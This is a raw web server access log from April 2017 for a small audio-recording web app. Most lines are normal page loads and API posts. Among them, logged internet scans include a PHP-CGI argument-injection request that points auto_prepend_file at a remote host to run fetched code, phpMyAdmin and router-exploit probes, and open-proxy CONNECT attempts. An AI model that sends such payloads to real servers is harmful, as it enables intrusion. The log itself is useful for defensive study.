23.91.241.182 - - [07/Apr/2017:10:55:16 +0000] "GET / HTTP/1.1" 200 2271 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
52.27.216.199 - - [07/Apr/2017:10:56:03 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
23.91.241.182 - - [07/Apr/2017:10:56:03 +0000] "POST / HTTP/1.1" 500 83534 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:28:08 +0000] "GET / HTTP/1.1" 200 2273 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
52.27.216.199 - - [07/Apr/2017:11:29:13 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
23.91.241.182 - - [07/Apr/2017:11:29:13 +0000] "POST / HTTP/1.1" 200 2223 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:31:24 +0000] "GET /about HTTP/1.1" 301 5 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:31:25 +0000] "GET /about/ HTTP/1.1" 200 1062 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:31:26 +0000] "GET /services HTTP/1.1" 301 5 "http://52.27.216.199/about/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:31:26 +0000] "GET /services/ HTTP/1.1" 200 916 "http://52.27.216.199/about/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:31:27 +0000] "GET /contact HTTP/1.1" 301 5 "http://52.27.216.199/services/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:31:27 +0000] "GET /contact/ HTTP/1.1" 200 1070 "http://52.27.216.199/services/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:31:32 +0000] "GET / HTTP/1.1" 200 2273 "http://52.27.216.199/contact/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:40:23 +0000] "GET / HTTP/1.1" 200 2272 "http://52.27.216.199/contact/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:40:23 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:40:23 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 304 0 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:40:23 +0000] "GET /static/js/record_mic.js HTTP/1.1" 304 0 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [07/Apr/2017:11:40:23 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
52.27.216.199 - - [07/Apr/2017:11:40:53 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
23.91.241.182 - - [07/Apr/2017:11:40:53 +0000] "POST / HTTP/1.1" 200 2223 "http://52.27.216.199/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.93.109 - - [07/Apr/2017:23:44:20 +0000] "GET / HTTP/1.1" 400 55701 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [07/Apr/2017:23:44:20 +0000] "GET /favicon.ico HTTP/1.1" 400 55803 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [07/Apr/2017:23:44:20 +0000] "GET /favicon.ico HTTP/1.1" 400 55833 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [07/Apr/2017:23:45:22 +0000] "GET / HTTP/1.1" 200 2232 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [07/Apr/2017:23:45:22 +0000] "GET /static/js/recorder.js HTTP/1.1" 200 13027 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [07/Apr/2017:23:45:22 +0000] "GET /static/js/record_mic.js HTTP/1.1" 200 278 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [07/Apr/2017:23:45:22 +0000] "GET /static/img/music.jpg HTTP/1.1" 200 211664 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [07/Apr/2017:23:45:22 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 200 284184 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.22 - - [07/Apr/2017:23:45:35 +0000] "GET / HTTP/1.1" 200 2234 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.22 - - [07/Apr/2017:23:45:35 +0000] "GET /static/js/recorder.js HTTP/1.1" 200 13027 "http://35.163.12.69:81/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.22 - - [07/Apr/2017:23:45:35 +0000] "GET /static/js/record_mic.js HTTP/1.1" 200 278 "http://35.163.12.69:81/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.22 - - [07/Apr/2017:23:45:35 +0000] "GET /static/img/music.jpg HTTP/1.1" 200 211664 "http://35.163.12.69:81/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.22 - - [07/Apr/2017:23:45:36 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 200 284184 "http://35.163.12.69:81/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.22 - - [07/Apr/2017:23:45:37 +0000] "GET /favicon.ico HTTP/1.1" 404 1026 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.93.109 - - [07/Apr/2017:23:48:02 +0000] "POST /result HTTP/1.1" 200 78 "-" "curl/7.29.0"
24.114.95.58 - - [08/Apr/2017:00:03:52 +0000] "POST /result HTTP/1.1" 200 53 "-" "python-requests/2.13.0"
132.205.229.22 - - [08/Apr/2017:00:12:18 +0000] "POST /result HTTP/1.1" 200 60 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.22 - - [08/Apr/2017:00:13:42 +0000] "POST /result HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.22 - - [08/Apr/2017:00:17:00 +0000] "POST /result HTTP/1.1" 200 53 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.93.109 - - [08/Apr/2017:00:17:10 +0000] "GET / HTTP/1.1" 200 2234 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:17:53 +0000] "POST /result HTTP/1.1" 200 78 "-" "curl/7.29.0"
132.205.93.109 - - [08/Apr/2017:00:18:19 +0000] "POST /result HTTP/1.1" 200 78 "-" "curl/7.29.0"
24.114.95.58 - - [08/Apr/2017:00:19:40 +0000] "POST /result HTTP/1.1" 200 53 "-" "python-requests/2.13.0"
24.114.95.58 - - [08/Apr/2017:00:22:24 +0000] "POST /result HTTP/1.1" 200 55 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:00:32:58 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:33:06 +0000] "GET / HTTP/1.1" 200 2236 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:33:49 +0000] "GET / HTTP/1.1" 200 2267 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:33:49 +0000] "GET /static/js/recorder.js HTTP/1.1" 200 13027 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:33:49 +0000] "GET /static/js/record_mic.js HTTP/1.1" 200 278 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:33:50 +0000] "GET /static/img/music.jpg HTTP/1.1" 200 211664 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:33:50 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 200 284184 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:34:55 +0000] "POST / HTTP/1.1" 502 181 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:00:35:42 +0000] "GET / HTTP/1.1" 200 2273 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [08/Apr/2017:00:36:10 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:00:36:10 +0000] "POST / HTTP/1.1" 200 2223 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.95.58 - - [08/Apr/2017:00:39:23 +0000] "POST /result HTTP/1.1" 200 55 "-" "python-requests/2.13.0"
24.114.95.58 - - [08/Apr/2017:01:03:13 +0000] "POST /result HTTP/1.1" 200 55 "-" "python-requests/2.13.0"
24.114.95.58 - - [08/Apr/2017:01:05:20 +0000] "POST /result HTTP/1.1" 200 60 "-" "python-requests/2.13.0"
24.114.95.58 - - [08/Apr/2017:01:10:32 +0000] "POST /result HTTP/1.1" 200 53 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:01:47:57 +0000] "GET / HTTP/1.1" 200 2274 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [08/Apr/2017:01:48:22 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:01:48:22 +0000] "POST / HTTP/1.1" 200 2223 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:01:55:59 +0000] "GET / HTTP/1.1" 200 2273 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [08/Apr/2017:01:56:02 +0000] "POST /result HTTP/1.1" 200 53 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:01:56:02 +0000] "POST / HTTP/1.1" 200 2258 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [08/Apr/2017:01:56:19 +0000] "POST /result HTTP/1.1" 200 53 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:01:56:19 +0000] "POST / HTTP/1.1" 200 2258 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [08/Apr/2017:01:56:23 +0000] "POST /result HTTP/1.1" 200 53 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:01:56:23 +0000] "POST / HTTP/1.1" 200 2258 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:02:03:30 +0000] "GET / HTTP/1.1" 200 2234 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:02:03:36 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:02:08:06 +0000] "GET / HTTP/1.1" 200 2272 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:02:08:06 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:02:08:06 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:02:08:06 +0000] "GET /static/js/record_mic.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [08/Apr/2017:02:08:06 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [08/Apr/2017:02:08:43 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:02:08:43 +0000] "POST / HTTP/1.1" 200 2223 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [08/Apr/2017:02:10:07 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
132.205.93.109 - - [08/Apr/2017:02:10:07 +0000] "POST / HTTP/1.1" 200 2223 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.95.58 - - [08/Apr/2017:02:10:36 +0000] "GET / HTTP/1.1" 200 2273 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.95.58 - - [08/Apr/2017:02:10:36 +0000] "GET /static/js/recorder.js HTTP/1.1" 200 13027 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.95.58 - - [08/Apr/2017:02:10:36 +0000] "GET /static/js/record_mic.js HTTP/1.1" 200 278 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.95.58 - - [08/Apr/2017:02:10:37 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 200 284184 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.95.58 - - [08/Apr/2017:02:10:37 +0000] "GET /static/img/music.jpg HTTP/1.1" 200 211664 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.95.58 - - [08/Apr/2017:02:10:37 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
35.163.12.69 - - [08/Apr/2017:02:10:52 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
24.114.95.58 - - [08/Apr/2017:02:10:52 +0000] "POST / HTTP/1.1" 200 2223 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
124.120.12.201 - - [08/Apr/2017:02:31:50 +0000] "GET / HTTP/1.0" 502 181 "-" "-"
23.91.241.182 - - [08/Apr/2017:03:08:15 +0000] "GET / HTTP/1.1" 200 2235 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:03:08:15 +0000] "GET /static/js/recorder.js HTTP/1.1" 200 13027 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:03:08:15 +0000] "GET /static/js/record_mic.js HTTP/1.1" 200 278 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:03:08:15 +0000] "GET /static/img/music.jpg HTTP/1.1" 200 211664 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:03:08:15 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 200 284184 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:03:08:16 +0000] "GET /favicon.ico HTTP/1.1" 404 1026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:03:08:16 +0000] "GET /favicon.ico HTTP/1.1" 404 1026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:03:08:36 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:03:08:37 +0000] "GET /favicon.ico HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [08/Apr/2017:04:07:22 +0000] "POST /result HTTP/1.1" 200 53 "-" "python-requests/2.13.0"
199.231.177.2 - - [08/Apr/2017:06:20:19 +0000] "GET /cgi-bin/basic.cgi?msubmenu=ip&action=view HTTP/1.0" 502 181 "-" "AccServer[CBSD-AVIGILON01]/5.6.2.26(34205) 64-bit HTTP-Agent"
199.231.177.2 - - [08/Apr/2017:06:20:19 +0000] "GET /cgi-bin/basic.cgi?msubmenu=ip&action=view HTTP/1.0" 502 181 "-" "AccServer[CBSD-AVIGILON01]/5.6.2.26(34205) 64-bit HTTP-Agent"
71.6.146.186 - - [08/Apr/2017:06:58:09 +0000] "GET / HTTP/1.1" 200 5557 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
61.164.149.211 - - [08/Apr/2017:09:44:36 +0000] "GET http://www.server110.com/ HTTP/1.1" 200 5557 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)"
61.164.149.211 - - [08/Apr/2017:09:44:37 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
61.164.149.211 - - [08/Apr/2017:09:44:38 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
61.164.149.211 - - [08/Apr/2017:09:44:38 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
188.36.250.14 - - [08/Apr/2017:09:52:44 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
71.6.167.142 - - [08/Apr/2017:14:27:58 +0000] "GET / HTTP/1.1" 200 5557 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.27.217.34 - - [08/Apr/2017:15:34:33 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
139.162.66.65 - - [08/Apr/2017:16:17:58 +0000] "GET / HTTP/1.1" 200 2233 "-" "Mozilla/5.0"
185.69.69.71 - - [08/Apr/2017:17:46:09 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
191.96.249.97 - - [08/Apr/2017:22:17:28 +0000] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D\x22\x22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 502 181 "-" "-"
188.36.250.14 - - [09/Apr/2017:00:07:13 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
187.38.70.200 - - [09/Apr/2017:00:14:31 +0000] "GET /hndUnblock.cgi HTTP/1.0" 502 181 "-" "Wget(linux)"
187.38.70.200 - - [09/Apr/2017:00:14:32 +0000] "GET /tmUnblock.cgi HTTP/1.0" 502 181 "-" "Wget(linux)"
187.38.70.200 - - [09/Apr/2017:00:14:32 +0000] "POST /cgi?2 HTTP/1.0" 502 181 "-" "Wget(linux)"
187.38.70.200 - - [09/Apr/2017:00:14:33 +0000] "GET / HTTP/1.0" 502 181 "-" "Wget(linux)"
185.69.69.72 - - [09/Apr/2017:00:20:45 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
78.110.15.254 - - [09/Apr/2017:01:04:47 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 502 181 "-" "ZmEu"
78.110.15.254 - - [09/Apr/2017:01:04:48 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 502 181 "-" "ZmEu"
78.110.15.254 - - [09/Apr/2017:01:04:50 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 502 181 "-" "ZmEu"
78.110.15.254 - - [09/Apr/2017:01:04:57 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 502 181 "-" "ZmEu"
78.110.15.254 - - [09/Apr/2017:01:04:58 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 502 181 "-" "ZmEu"
78.110.15.254 - - [09/Apr/2017:01:05:00 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 502 181 "-" "ZmEu"
78.110.15.254 - - [09/Apr/2017:01:05:03 +0000] "GET /SQL/scripts/setup.php HTTP/1.1" 502 181 "-" "ZmEu"
78.110.15.254 - - [09/Apr/2017:01:05:03 +0000] "GET /myAdmin/scripts/setup.php HTTP/1.1" 502 181 "-" "ZmEu"
78.110.15.254 - - [09/Apr/2017:01:05:03 +0000] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 502 181 "-" "ZmEu"
139.162.124.167 - - [09/Apr/2017:01:07:23 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0"
209.126.136.2 - - [09/Apr/2017:02:15:01 +0000] "GET / HTTP/1.1" 502 583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
132.205.93.109 - - [09/Apr/2017:04:06:56 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:06:56 +0000] "GET /favicon.ico HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:06:59 +0000] "GET / HTTP/1.1" 200 2231 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:06:59 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:06:59 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:06:59 +0000] "GET /static/js/record_mic.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:06:59 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:06:59 +0000] "GET /favicon.ico HTTP/1.1" 404 1026 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:11:48 +0000] "GET /favicon.ico HTTP/1.1" 404 1026 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:20:58 +0000] "GET / HTTP/1.1" 200 2231 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:20:58 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:20:58 +0000] "GET /static/js/record_mic.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:20:58 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.109 - - [09/Apr/2017:04:20:58 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [09/Apr/2017:04:24:12 +0000] "POST /fingerprint HTTP/1.1" 200 80 "-" "curl/7.35.0"
35.163.12.69 - - [09/Apr/2017:04:25:11 +0000] "POST /result HTTP/1.1" 200 80 "-" "curl/7.35.0"
